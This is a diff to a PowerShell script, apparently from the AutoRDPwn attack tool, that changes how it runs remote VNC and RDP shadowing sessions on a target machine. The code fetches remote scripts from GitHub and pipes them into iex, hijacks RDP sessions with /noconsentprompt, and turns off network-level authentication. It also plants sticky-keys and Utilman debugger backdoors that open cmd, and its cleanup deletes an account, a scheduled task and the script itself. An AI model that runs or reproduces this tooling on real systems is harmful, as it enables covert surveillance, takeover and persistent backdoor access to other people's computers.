@@ -526,17 +526,14 @@ if($Language -in 'Spanish') {
 
         'ver' { $control = "false" ; Write-Host
 	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
-	if($vncserver) { powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }
 	Write-Host "$using:txt30" -ForegroundColor Blue }}
 
         'see' { $control = "false" ; Write-Host
 	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
-	if($vncserver) { powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }
 	Write-Host "$using:txt30" -ForegroundColor Blue }}
 
         'control*' { $control = "true" ; Write-Host
 	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
-	if($vncserver) { powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }
 	Write-Host "$using:txt31" -ForegroundColor Blue }}
 
         default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in 'ver','see','controlar','control')
@@ -558,6 +555,9 @@ if($Language -in 'Spanish') {
     Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray
     $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()} ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
+    if($vncserver){ invoke-command -session $RDP[0] -scriptblock {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCServer.ps1" -UseBasicParsing | iex }}
+	
     if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
@@ -568,8 +568,9 @@ if($Language -in 'Spanish') {
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine()
+	if($vncserver){ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1" -UseBasicParsing | iex ; .\VNCViewer $computer } else {
 	if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}
+        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}
 
         else { Write-Host "$version $txt37" -ForegroundColor Red
         invoke-command -session $RDP[0] -scriptblock {
@@ -593,8 +594,9 @@ if($Language -in 'Spanish') {
 
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt35" -ForegroundColor Blue ; sleep -milliseconds 2500
+    if($vncserver){ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1" -UseBasicParsing | iex ; .\VNCViewer $computer } else {
     if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-    if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}
+    if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
